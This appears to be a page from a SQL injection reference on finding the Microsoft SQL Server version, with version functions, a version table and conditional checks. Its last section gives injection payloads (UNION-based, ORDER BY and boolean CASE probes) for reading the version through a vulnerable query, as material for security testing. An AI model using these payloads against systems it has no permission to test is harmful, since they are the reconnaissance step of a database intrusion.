---
title: Testing Version
description: Methods to determine the version of Microsoft SQL Server
category: Basics
order: 3
tags: ["version detection", "reconnaissance"]
lastUpdated: 2025-03-15
---

## Testing Version

Identifying the version of Microsoft SQL Server is an important reconnaissance step in SQL injection testing. Different versions have different capabilities, vulnerabilities, and syntax support.

### Using Version Functions

MSSQL provides several functions to determine the database version:

| Function | Description |
|----------|-------------|
| `@@VERSION` | Returns complete version string with additional information |
| `SERVERPROPERTY('ProductVersion')` | Returns the major.minor.build version number |
| `SERVERPROPERTY('ProductLevel')` | Returns the update level (e.g., RTM, SP1, SP2) |
| `SERVERPROPERTY('Edition')` | Returns the edition (e.g., Enterprise, Standard) |

### Examples

```sql
-- Basic version information
SELECT @@VERSION;

-- More specific information
SELECT SERVERPROPERTY('ProductVersion') AS Version,
       SERVERPROPERTY('ProductLevel') AS Level,
       SERVERPROPERTY('Edition') AS Edition;
```

### Version-based Detection Techniques

You can use conditional statements to determine the version when direct version output isn't visible:

```sql
-- Test if version is 2012 or newer (>= 11)
IF CAST(SUBSTRING(CAST(SERVERPROPERTY('ProductVersion') AS VARCHAR), 1, 2) AS INT) >= 11
BEGIN
    -- SQL 2012+ specific code
END
ELSE
BEGIN
    -- Older version code
END
```

### Common Version Identifiers

The `@@VERSION` output starts with different text depending on the version:

| Version String | SQL Server Version |
|----------------|-------------------|
| Microsoft SQL Server 2019 | SQL Server 2019 (15.x) |
| Microsoft SQL Server 2017 | SQL Server 2017 (14.x) |
| Microsoft SQL Server 2016 | SQL Server 2016 (13.x) |
| Microsoft SQL Server 2014 | SQL Server 2014 (12.x) |
| Microsoft SQL Server 2012 | SQL Server 2012 (11.x) |
| Microsoft SQL Server 2008 R2 | SQL Server 2008 R2 (10.50.x) |
| Microsoft SQL Server 2008 | SQL Server 2008 (10.0.x) |
| Microsoft SQL Server 2005 | SQL Server 2005 (9.x) |
| Microsoft SQL Server 2000 | SQL Server 2000 (8.x) |

### Injection Examples

```sql
-- Using ORDER BY to test version-specific syntax
SELECT * FROM users WHERE id = 1 ORDER BY (SELECT @@VERSION)--

-- Using a UNION attack to display version
SELECT * FROM users WHERE id = -1 UNION ALL SELECT 1, @@VERSION, 3--

-- Testing version with conditional logic
SELECT * FROM users WHERE id = 1 AND
(CASE WHEN CAST(SUBSTRING(CAST(SERVERPROPERTY('ProductVersion') AS VARCHAR), 1, 2) AS INT) >= 11
      THEN 1 ELSE 0 END) = 1--
```

Determining the specific version of MSSQL helps tailor the rest of your injection techniques to the features and vulnerabilities present in that version.
